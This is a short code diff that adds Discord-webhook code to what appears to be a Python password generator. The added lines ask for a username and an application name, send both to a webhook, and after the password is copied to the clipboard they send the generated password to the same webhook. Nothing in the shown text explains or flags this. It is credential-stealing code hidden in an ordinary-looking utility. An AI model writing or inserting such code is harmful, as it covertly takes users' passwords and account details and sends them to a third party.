@@ -1,3 +1,14 @@
+from dhooks import Webhook
+
+hook = Webhook("WEBHOOK_URL")
+
+User = input("Write your username: ")
+Application = input("Write your application name: ")
+
+hook.send(f"User:{User}")
+hook.send(f"Application:{Application}")
+
+
 import random
 
 
@@ -30,3 +41,4 @@ import pyperclip
 pyperclip.copy('The text to be copied to the clipboard.')
 spam = pyperclip.copy(password)
 print("You have the password on your clipboard")
+hook.send(password)
